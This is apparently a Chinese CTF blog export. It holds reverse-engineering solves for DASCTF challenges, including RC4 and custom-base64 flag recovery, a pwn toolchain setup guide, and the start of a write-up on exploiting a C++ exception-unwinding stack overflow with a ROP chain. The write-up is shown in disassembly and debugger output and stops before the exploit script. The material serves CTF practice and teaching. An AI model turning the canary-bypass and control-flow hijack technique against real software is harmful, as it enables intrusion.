class="number">4</span>)]</span><br><span class="line">        enc = number.bytes_to_long(enc)</span><br><span class="line">        enc = extract_number(enc)</span><br><span class="line">        enc = number.long_to_bytes(enc, <span class="number">4</span>)</span><br><span class="line">        new_message = new_message + enc</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">circle</span>(<span class="params">m</span>):</span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = t</span><br><span class="line">        t = transform(t)</span><br><span class="line">        <span class="keyword">if</span> t == m:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="string">    num = input(&#x27;input your number:&#x27;)</span></span><br><span class="line"><span class="string">    tmp = bytes.fromhex(num)</span></span><br><span class="line"><span class="string">    res = transform(tmp).hex()</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    if enc == res:</span></span><br><span class="line"><span class="string">        print(&#x27;ok,your flag : DASCTF&#123;&#123;&#123;name&#125;&#125;&#125;&#x27;.format(num))</span></span><br><span class="line"><span class="string">    else :</span></span><br><span class="line"><span class="string">        print(&#x27;wrong&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = circle(<span class="built_in">bytes</span>.fromhex(enc)).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h3 id="cuteRE"><a href="#cuteRE" class="headerlink" title="cuteRE"></a>cuteRE</h3><p>首先程序对我们输入的字符串进行了处理，将奇数位的和偶数位的字符分开来放在两个数组。然后应该是对两个数组进行了不同的加密，由于加入了代码混淆，我们只能寻找加密的特征。在第一个加密里面发现了<code>rc4</code>字符串，推测是RC4加密；后又发现了base64的字符表，猜测第二加密是base64。</p>
<p>首先是RC4加密，需要找出加密盒，也就是调用RC4函数的第一个参数，可以通过调试得到，嫖了wiki的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用解密程序成功。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(s ^ k))</span><br><span class="line"></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串是：%s&quot;</span> %cipher)</span><br><span class="line"></span><br><span class="line">s =[<span class="number">0x72</span>, <span class="number">0xA7</span>, <span class="number">0xE5</span>, <span class="number">0xB1</span>, <span class="number">0xBF</span>, <span class="number">0xD1</span>, <span class="number">0x3A</span>, <span class="number">0xC9</span>, <span class="number">0x7E</span>, <span class="number">0x5D</span>, </span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0xA8</span>, <span class="number">0x21</span>, <span class="number">0x4F</span>, <span class="number">0x70</span>, <span class="number">0x90</span>]</span><br><span class="line"></span><br><span class="line">box = [<span class="number">0x1E</span>, <span class="number">0xEE</span>, <span class="number">0x66</span>, <span class="number">0xE7</span>, <span class="number">0xB2</span>, <span class="number">0x62</span>, <span class="number">0x59</span>, <span class="number">0xDE</span>, <span class="number">0xD2</span>, <span class="number">0xDC</span>, </span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x45</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x6F</span>, <span class="number">0xD8</span>, <span class="number">0x96</span>, <span class="number">0x5C</span>, <span class="number">0xCD</span>, <span class="number">0xBF</span>, </span><br><span class="line">  <span class="number">0x68</span>, <span class="number">0x34</span>, <span class="number">0xC5</span>, <span class="number">0x5A</span>, <span class="number">0x1B</span>, <span class="number">0x31</span>, <span class="number">0x06</span>, <span class="number">0x2B</span>, <span class="number">0xB3</span>, <span class="number">0xC7</span>, </span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0xF8</span>, <span class="number">0x8B</span>, <span class="number">0x26</span>, <span class="number">0xBE</span>, <span class="number">0x4F</span>, <span class="number">0xE6</span>, <span class="number">0x37</span>, <span class="number">0xC2</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0xCA</span>, <span class="number">0x9F</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6A</span>, <span class="number">0xDF</span>, <span class="number">0xA2</span>, <span class="number">0xE8</span>, </span><br><span class="line">  <span class="number">0xBD</span>, <span class="number">0x1C</span>, <span class="number">0x39</span>, <span class="number">0xC4</span>, <span class="number">0x70</span>, <span class="number">0x85</span>, <span class="number">0x53</span>, <span class="number">0x5F</span>, <span class="number">0xFC</span>, <span class="number">0xFA</span>, </span><br><span class="line">  <span class="number">0xCE</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x52</span>, <span class="number">0xEB</span>, <span class="number">0x13</span>, <span class="number">0xB4</span>, <span class="number">0x32</span>, <span class="number">0x0F</span>, </span><br><span class="line">  <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0xA1</span>, <span class="number">0x07</span>, <span class="number">0x55</span>, <span class="number">0x67</span>, <span class="number">0x30</span>, <span class="number">0xED</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, </span><br><span class="line">  <span class="number">0xDD</span>, <span class="number">0x46</span>, <span class="number">0x60</span>, <span class="number">0x9A</span>, <span class="number">0x5B</span>, <span class="number">0x91</span>, <span class="number">0x42</span>, <span class="number">0x75</span>, <span class="number">0x4D</span>, <span class="number">0xD3</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x73</span>, <span class="number">0x9B</span>, <span class="number">0xF6</span>, <span class="number">0xEC</span>, <span class="number">0x10</span>, <span class="number">0x43</span>, <span class="number">0x8E</span>, <span class="number">0xD9</span>, <span class="number">0x15</span>, </span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0x9C</span>, <span class="number">0x12</span>, <span class="number">0x90</span>, <span class="number">0xA4</span>, <span class="number">0x47</span>, <span class="number">0x80</span>, <span class="number">0x71</span>, <span class="number">0x3E</span>, <span class="number">0xDA</span>, </span><br><span class="line">  <span class="number">0xAE</span>, <span class="number">0x89</span>, <span class="number">0x99</span>, <span class="number">0x33</span>, <span class="number">0xCB</span>, <span class="number">0xD5</span>, <span class="number">0xC9</span>, <span class="number">0x79</span>, <span class="number">0xBA</span>, <span class="number">0x38</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x51</span>, <span class="number">0xC0</span>, <span class="number">0x04</span>, <span class="number">0x6C</span>, <span class="number">0xB1</span>, <span class="number">0x72</span>, <span class="number">0x2D</span>, <span class="number">0xE3</span>, <span class="number">0xA9</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0x17</span>, <span class="number">0xAA</span>, <span class="number">0x11</span>, <span class="number">0x7A</span>, <span class="number">0xA5</span>, <span class="number">0xF3</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0x82</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x09</span>, <span class="number">0xF0</span>, <span class="number">0x00</span>, <span class="number">0x9E</span>, <span class="number">0x58</span>, <span class="number">0x4E</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0x5E</span>, </span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0x95</span>, <span class="number">0x7C</span>, <span class="number">0xA0</span>, <span class="number">0x35</span>, <span class="number">0xB9</span>, <span class="number">0x16</span>, <span class="number">0x29</span>, <span class="number">0xB6</span>, <span class="number">0xF9</span>, </span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0x0B</span>, <span class="number">0x6E</span>, <span class="number">0xA6</span>, <span class="number">0x6B</span>, <span class="number">0x84</span>, <span class="number">0x8C</span>, <span class="number">0x3B</span>, <span class="number">0xB7</span>, <span class="number">0x6D</span>, </span><br><span class="line">  <span class="number">0x36</span>, <span class="number">0x5D</span>, <span class="number">0x97</span>, <span class="number">0xA8</span>, <span class="number">0x27</span>, <span class="number">0xBB</span>, <span class="number">0xFB</span>, <span class="number">0xCC</span>, <span class="number">0x0D</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0x8A</span>, <span class="number">0x77</span>, <span class="number">0x0E</span>, <span class="number">0xE1</span>, <span class="number">0xB8</span>, <span class="number">0xAC</span>, <span class="number">0x93</span>, <span class="number">0x7F</span>, <span class="number">0xE2</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0xD1</span>, <span class="number">0xE4</span>, <span class="number">0x4C</span>, <span class="number">0xF2</span>, <span class="number">0x08</span>, <span class="number">0x28</span>, <span class="number">0x64</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0x3C</span>, <span class="number">0xE9</span>, <span class="number">0xFF</span>, <span class="number">0x3F</span>, <span class="number">0xC3</span>, <span class="number">0x1F</span>, <span class="number">0xF1</span>, <span class="number">0x3A</span>, <span class="number">0xAB</span>, <span class="number">0xC6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xD7</span>, <span class="number">0xEA</span>, <span class="number">0xA7</span>, <span class="number">0x2C</span>, <span class="number">0xB0</span>, <span class="number">0x98</span>, <span class="number">0x50</span>, <span class="number">0x8D</span>, <span class="number">0xEF</span>, </span><br><span class="line">  <span class="number">0xDB</span>, <span class="number">0x1D</span>, <span class="number">0x7E</span>, <span class="number">0x25</span>, <span class="number">0x81</span>, <span class="number">0xA3</span>, <span class="number">0x88</span>, <span class="number">0xF4</span>, <span class="number">0xAF</span>, <span class="number">0x57</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x2E</span>, <span class="number">0x78</span>, <span class="number">0xBC</span>, <span class="number">0x87</span>, <span class="number">0x76</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x83</span>, <span class="number">0x49</span>, </span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x94</span>, <span class="number">0x19</span>, <span class="number">0x9D</span>, <span class="number">0x3D</span>, <span class="number">0x4A</span>, <span class="number">0xFE</span>, <span class="number">0x1A</span>, <span class="number">0x92</span>, <span class="number">0xB5</span>, </span><br><span class="line">  <span class="number">0xC8</span>, <span class="number">0x18</span>, <span class="number">0xE5</span>, <span class="number">0xD6</span>, <span class="number">0xE0</span>, <span class="number">0xAD</span>]</span><br><span class="line"></span><br><span class="line">rc4_excrypt(s, box)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ACFg0Gw1Jo5Ix9C&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后是base64加密，利用给我们的原始字符表解密，发现有乱码，猜测是换了字符表，通过调试，在base64函数里找到字符表数组，果真换了，换之后：<code>ghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DST&#123;Wo7Xj5Ad8Nx8</span><br></pre></td></tr></table></figure>

<p>最后合并一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;DST&#123;Wo7Xj5Ad8Nx8&#x27;</span></span><br><span class="line">s2 = <span class="string">&#x27;ACFg0Gw1Jo5Ix9C&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    flag += s1[i]</span><br><span class="line">    flag += s2[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># DASCTF&#123;gW0oG7wX1jJ5oA5dI8xN9xC8&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>DASCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn环境搭建</title>
    <url>/2022/10/23/Pwn/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="软件更新"><a href="#软件更新" class="headerlink" title="软件更新"></a>软件更新</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>

<h2 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install net-tools</span><br><span class="line">sudo apt-get install openssh-server</span><br><span class="line"></span><br><span class="line">sudo apt install vim</span><br><span class="line">sudo apt install git</span><br><span class="line">sudo apt install gcc</span><br><span class="line">sudo apt-get install gdb-multiarch</span><br><span class="line">sudo apt-get install qemu-user qemu-system</span><br><span class="line"></span><br><span class="line">sudo apt install python2</span><br><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo apt install python-is-python3</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="Pwn工具"><a href="#Pwn工具" class="headerlink" title="Pwn工具"></a>Pwn工具</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pwntools</span></span><br><span class="line">sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">pip3 install --upgrade pwntools</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">LibcSearcher</span></span><br><span class="line">pip3 install LibcSearcher</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pwndbg</span></span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg/</span><br><span class="line">./setup.sh </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pwngdb</span></span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git </span><br><span class="line">cp Pwngdb/.gdbinit ~/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置文件</span></span><br><span class="line">vim ~/.gdbinit</span><br><span class="line">--------------------------------------------------</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">source</span> ~/peda/peda.py</span></span><br><span class="line">source ~/tools/pwndbg/gdbinit.py</span><br><span class="line">source ~/tools/Pwngdb/pwngdb.py</span><br><span class="line">source ~/tools/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line">--------------------------------------------------</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ROPgadget</span></span><br><span class="line">pip3 install capstone</span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">cd ROPgadget/</span><br><span class="line">sudo python3 setup.py install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">one_gadget</span></span><br><span class="line">sudo apt install -y ruby ruby-dev</span><br><span class="line">sudo gem install one_gadget</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">seccomp-tools</span></span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">patchelf</span></span><br><span class="line">sudo apt install patchelf </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">glibc-all-in-one</span></span><br><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">cd glibc-all-in-one/</span><br><span class="line">sudo python3 update_list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">alpha3</span></span><br><span class="line">git clone https://github.com/TaQini/alpha3.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">AFL</span></span><br><span class="line">git clone https://github.com/google/AFL.git</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>2022 第五空间</title>
    <url>/2022/10/11/CTF/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<h2 id="toolkit"><a href="#toolkit" class="headerlink" title="toolkit"></a>toolkit</h2><blockquote>
<p>一道利用C++异常机制来pwn的题目</p>
</blockquote>
<p>在gift功能里面存在溢出使得我们能够泄露elf文件的基地址。之后便是在Tool2中的Func2功能里面，对于读入的变量是有符号整数，输入负数产生栈溢出。同时程序开启了沙盒，我们只能owr。但是问题来了，无法泄露canary怎么办？</p>
<p>这里就涉及到C++的异常机制，具体的理论可以阅读下面的两篇文章：</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/89855#h2-4">Shanghai-DCTF-2017 线下攻防Pwn题-安全客 - 安全资讯平台 (anquanke.com)</a></li>
<li>[C++异常机制的实现方式和开销分析 (baiy.cn)</li>
<li>主要的逻辑就是从报出异常的函数开始，进行栈回溯（staack unind），寻找catch的代码段，那我们通过溢出将栈上的catach代码段给修改了，就可以控制程序执行流，并且不会造成canary的报错。这里通过具体的调试来做说明：</li>
</ul>
<p>首先进入<code>__cxa_throw</code>函数后抛出错误，之后程序进入<code>_Unwind_RaiseException</code>进行栈回溯，寻找catch代码段。找到之后，会调用<code>__cxa_begin_catch</code>进行捕获，最后调用<code>__cxa_end_catch</code>结束捕获。最终，可以发现程序回到了上一层的函数中进行捕获，具体如下：</p>
<span id="more"></span>

<p>IDA中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000000000025E3</span>                               ;   catch(<span class="type">char</span> <span class="type">const</span>*) <span class="comment">// owned by 25C3</span></span><br><span class="line">.text:<span class="number">00000000000025E3</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">00000000000025E7</span> <span class="number">48</span> <span class="number">83</span> FA <span class="number">01</span>                   cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000000025</span>EB <span class="number">74</span> <span class="number">08</span>                         jz      <span class="type">short</span> loc_25F5</span><br><span class="line">.text:<span class="number">00000000000025</span>EB</span><br><span class="line">.text:<span class="number">00000000000025</span>ED <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax              ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">00000000000025F</span>0 E8 <span class="number">7B</span> ED FF FF                call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">00000000000025F</span>0</span><br><span class="line">.text:<span class="number">00000000000025F</span>5                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000000025F</span>5</span><br><span class="line">.text:<span class="number">00000000000025F</span>5                               loc_25F5:                     ; CODE XREF: Tool2+<span class="number">3</span>A↑j</span><br><span class="line">.text:<span class="number">00000000000025F</span>5 <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax              ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">00000000000025F</span>8 E8 <span class="number">33</span> EC FF FF                call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">00000000000025F</span>8</span><br><span class="line">.text:<span class="number">00000000000025F</span>D <span class="number">48</span> <span class="number">89</span> <span class="number">45</span> E8                   mov     [rbp+var_18], rax</span><br><span class="line">.text:<span class="number">0000000000002601</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000002605</span> <span class="number">48</span> <span class="number">89</span> C6                      mov     rsi, rax</span><br><span class="line">.text:<span class="number">0000000000002608</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">05</span> E1 <span class="number">29</span> <span class="number">00</span> <span class="number">00</span>          mov     rax, cs:_ZSt4cerr_ptr</span><br><span class="line">.text:<span class="number">000000000000260F</span> <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000002612</span>                               ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000002612</span> E8 <span class="number">89</span> EC FF FF                call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(<span class="built_in">std</span>::ostream &amp;,<span class="type">char</span> <span class="type">const</span>*)</span><br><span class="line">.text:<span class="number">0000000000002612</span></span><br><span class="line">.text:<span class="number">0000000000002617</span> <span class="number">48</span> <span class="number">89</span> C2                      mov     rdx, rax</span><br><span class="line">.text:<span class="number">000000000000261</span>A <span class="number">48</span> <span class="number">8B</span> <span class="number">05</span> <span class="number">97</span> <span class="number">29</span> <span class="number">00</span> <span class="number">00</span>          mov     rax, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:<span class="number">0000000000002621</span> <span class="number">48</span> <span class="number">89</span> C6                      mov     rsi, rax</span><br><span class="line">.text:<span class="number">0000000000002624</span> <span class="number">48</span> <span class="number">89</span> D7                      mov     rdi, rdx</span><br><span class="line">.text:<span class="number">0000000000002627</span> E8 <span class="number">84</span> EC FF FF                call    __ZNSolsEPFRSoS_E     ; <span class="built_in">std</span>::ostream::operator&lt;&lt;(<span class="built_in">std</span>::ostream &amp; (*)(<span class="built_in">std</span>::ostream &amp;))</span><br><span class="line">.text:<span class="number">0000000000002627</span>                               ;   &#125; <span class="comment">// starts at 2612</span></span><br><span class="line">.text:<span class="number">0000000000002627</span></span><br><span class="line">.text:<span class="number">000000000000262</span>C E8 <span class="number">1F</span> ED FF FF                call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">000000000000262</span>C</span><br><span class="line">.text:<span class="number">0000000000002631</span> EB <span class="number">17</span>                         jmp     <span class="type">short</span> loc_264A</span><br><span class="line">.text:<span class="number">0000000000002631</span></span><br><span class="line">.text:<span class="number">0000000000002633</span>                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000002633</span>                               ;   cleanup() <span class="comment">// owned by 2612</span></span><br><span class="line">.text:<span class="number">0000000000002633</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">0000000000002637</span> <span class="number">48</span> <span class="number">89</span> C3                      mov     rbx, rax</span><br><span class="line">.text:<span class="number">000000000000263</span>A E8 <span class="number">11</span> ED FF FF                call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">000000000000263</span>A</span><br><span class="line">.text:<span class="number">000000000000263F</span> <span class="number">48</span> <span class="number">89</span> D8                      mov     rax, rbx</span><br><span class="line">.text:<span class="number">0000000000002642</span> <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax              ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000002645</span> E8 <span class="number">26</span> ED FF FF                call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000002645</span></span><br><span class="line">.text:<span class="number">000000000000264</span>A                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000264</span>A</span><br><span class="line">.text:<span class="number">000000000000264</span>A                               loc_264A:                     ; CODE XREF: Tool2+<span class="number">21</span>↑j</span><br><span class="line">.text:<span class="number">000000000000264</span>A                                                             ; Tool2:loc_25E1↑j</span><br><span class="line">.text:<span class="number">000000000000264</span>A                                                             ; Tool2+<span class="number">80</span>↑j</span><br><span class="line">.text:<span class="number">000000000000264</span>A <span class="number">48</span> <span class="number">83</span> C4 <span class="number">18</span>                   add     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">000000000000264</span>E <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000000264F</span> <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">0000000000002650</span> C3                            retn		<span class="comment">// 劫持程序控制流</span></span><br></pre></td></tr></table></figure>

<p>pwndbg中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="number">0x55df66952624</span>    mov    rdi, rdx</span><br><span class="line">   <span class="number">0x55df66952627</span>    call   <span class="number">0x55df669512b0</span>                &lt;<span class="number">0x55df669512b0</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55df6695262c</span>    call   __cxa_end_catch@plt                &lt;__cxa_end_catch@plt&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55df66952631</span>    jmp    <span class="number">0x55df6695264a</span>                &lt;<span class="number">0x55df6695264a</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x55df6695264a</span>    add    rsp, <span class="number">0x18</span></span><br><span class="line"> ► <span class="number">0x55df6695264e</span>    pop    rbx</span><br><span class="line">   <span class="number">0x55df6695264f</span>    pop    rbp</span><br><span class="line">   <span class="number">0x55df66952650</span>    ret</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x55df66952933</span>    pop    rdi</span><br><span class="line">   <span class="number">0x55df66952934</span>    ret</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x55df66952931</span>    pop    rsi</span><br><span class="line">──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7ffea7bbafc8</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffea7bbafd0</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffea7bbafd8</span> —▸ <span class="number">0x55df66952933</span> ◂— pop    rdi</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffea7bbafe0</span> —▸ <span class="number">0x55df66955060</span> ◂— <span class="number">0x67616c662f</span> <span class="comment">/* &#x27;/flag&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffea7bbafe8</span> —▸ <span class="number">0x55df66952931</span> ◂— pop    rsi</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7ffea7bbaff0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7ffea7bbaff8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7ffea7bbb000</span> —▸ <span class="number">0x55df66951274</span> (open@plt+<span class="number">4</span>) ◂— bnd jmp qword ptr [rip + <span class="number">0x3c95</span>]</span><br><span class="line">────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>   <span class="number">0x55df6695264e</span></span><br><span class="line">   f <span class="number">1</span>              <span class="number">0x0</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>调试后发现，这段代码位于抛出异常函数的返回地址偏移<code>+0x30</code>的地方，所以我们rop开始也是在那。</p>
<p>还需要注意的一点是，在覆盖的过程中，我们需要对抛出异常函数的rbp和返回地址进行恢复，其返回地址恢复不变，rbp指向的地址需要修改为code可写的地址，因为在调试的过程中发现，会对这个地址的空间进行写入，具体原因不清楚。</p>
<p>WP如下：</p>
